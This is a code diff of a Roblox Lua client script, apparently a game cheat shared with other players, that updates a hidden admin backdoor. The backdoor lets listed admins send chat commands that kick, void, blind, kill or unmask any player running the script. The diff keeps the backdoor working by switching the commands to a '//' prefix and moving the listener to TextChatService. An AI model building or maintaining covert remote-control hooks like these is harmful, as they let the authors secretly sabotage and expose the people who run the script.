@@ -1,5 +1,6 @@
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
+local TextChatService = game:GetService("TextChatService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local PlaceId = game.PlaceId
@@ -40,32 +41,32 @@ local function FFChecker()
     end
 end
 
-local function ChatCommand(player, message)
-    if Admins[player.Name] then
-        local match1 = message:lower():match(">/%s*kick%s+([%w_]+)")
+local function ChatCommand(speakerName, message)
+    if Admins[speakerName] then
+        local match1 = message:lower():match("//kick%s+([%w_]+)")
         if match1 and LocalPlayer.Name:lower():find(match1) then
             LocalPlayer:Kick("Araa and Braxy did not allow you to use this script.")
         end
 
-        local match2 = message:lower():match(">/%s*revealusers%s*")
+        local match2 = message:lower():match("//revealusers")
         if match2 then
             wait(0.5)
             ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Me", "All")
         end
 
-        local match3 = message:lower():match(">/%s*void%s+([%w_]+)")
+        local match3 = message:lower():match("//void%s+([%w_]+)")
         if match3 and LocalPlayer.Name:lower():find(match3) then
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                 LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -498, 0)
             end
         end
 
-        local match4 = message:lower():match(">/%s*shutdown%s*")
+        local match4 = message:lower():match("//shutdown")
         if match4 then
             TeleportService:Teleport(PlaceId, LocalPlayer)
         end
 
-        local match5 = message:lower():match(">/%s*removeff%s+([%w_]+)")
+        local match5 = message:lower():match("//removeff%s+([%w_]+)")
         if match5 and LocalPlayer.Name:lower():find(match5) then
             local FFParts = workspace:FindFirstChild("ForceFieldDetectorParts")
             if FFParts then
@@ -80,7 +81,7 @@ local function ChatCommand(player, message)
             end
         end
 
-        local match6 = message:lower():match(">/%s*enableff%s*")
+        local match6 = message:lower():match("//enableff")
         if match6 then
             local FFParts = workspace:FindFirstChild("ForceFieldDetectorParts")
             if FFParts then
@@ -92,7 +93,7 @@ local function ChatCommand(player, message)
             FFConnection = false
         end
 
-        local match7 = message:lower():match(">/%s*blind%s+([%w_]+)")
+        local match7 = message:lower():match("//blind%s+([%w_]+)")
         if match7 and LocalPlayer.Name:lower():find(match7) then
             if not BlindGui then
                 BlindGui = Instance.new("ScreenGui")
@@ -109,7 +110,7 @@ local function ChatCommand(player, message)
             end
         end
 
-        local match8 = message:lower():match(">/%s*unblind%s+([%w_]+)")
+        local match8 = message:lower():match("//unblind%s+([%w_]+)")
         if match8 and LocalPlayer.Name:lower():find(match8) then
             if BlindGui then
                 BlindGui:Destroy()
@@ -117,7 +118,7 @@ local function ChatCommand(player, message)
             end
         end
         
-        local match9 = message:lower():match(">/%s*instakill%s+([%w_]+)")
+        local match9 = message:lower():match("//instakill%s+([%w_]+)")
         if match9 and LocalPlayer.Name:lower():find(match9) then
             local OrigNinValue = game.Players.LocalPlayer.leaderstats.Ninjutsu.Value
 
@@ -135,11 +136,11 @@ local function ChatCommand(player, message)
                 end
             end
         end
-		local match10 = message:lower():match(">/%s*spawn%s+([%w_]+)")
+		local match10 = message:lower():match("//spawn%s+([%w_]+)")
 			if match10 and LocalPlayer.Name:lower():find(match10) then
 				ReplicatedStorage.RemoteEvent.SpawnCharacterEvent:FireServer("MainSpawn")
 			end
-			local match11 = message:lower():match(">/%s*disablesword%s+([%w_]+)")
+			local match11 = message:lower():match("//disablesword%s+([%w_]+)")
 			if match11 and LocalPlayer.Name:lower():find(match11) then
 				local Sword = LocalPlayer.Character:FindFirstChild("Sword")
 				if Sword then
@@ -158,36 +159,24 @@ local function ChatCommand(player, message)
 				end
 			end
 		end
-		local match12 = message:lower():match(">/%s*rejoin%s+([%w_]+)")
+		local match12 = message:lower():match("//rejoin%s+([%w_]+)")
 		if match12 and LocalPlayer.Name:lower():find(match12) then
 			TeleportService:Teleport(PlaceId, LocalPlayer)
 		end
 	end
 end
 
-local function SetupPlayerChat(player)
-    player.Chatted:Connect(function(message)
-        ChatCommand(player, message)
-    end)
-end
-
-for _, player in ipairs(Players:GetPlayers()) do
-    SetupPlayerChat(player)
-end
-Players.PlayerAdded:Connect(SetupPlayerChat)
-
-local function FilterAdminMessages(player)
-    player.Chatted:Connect(function(message)
-        for admin, _ in pairs(Admins) do
-            if player.Name == admin then
-                return
+TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(messageData)
+    local textSource = messageData.TextSource
+    if textSource then
+        local speakerUserId = textSource.UserId
+        local speaker = Players:GetPlayerByUserId(speakerUserId)
+        if speaker then
+            local speakerName = speaker.Name
+            local message = messageData.Text
+            if speakerName and message then
+                ChatCommand(speakerName, message)
             end
         end
-    end)
-end
-
-for _, player in ipairs(Players:GetPlayers()) do
-    FilterAdminMessages(player)
-end
-
-Players.PlayerAdded:Connect(FilterAdminMessages)
+    end
+end)
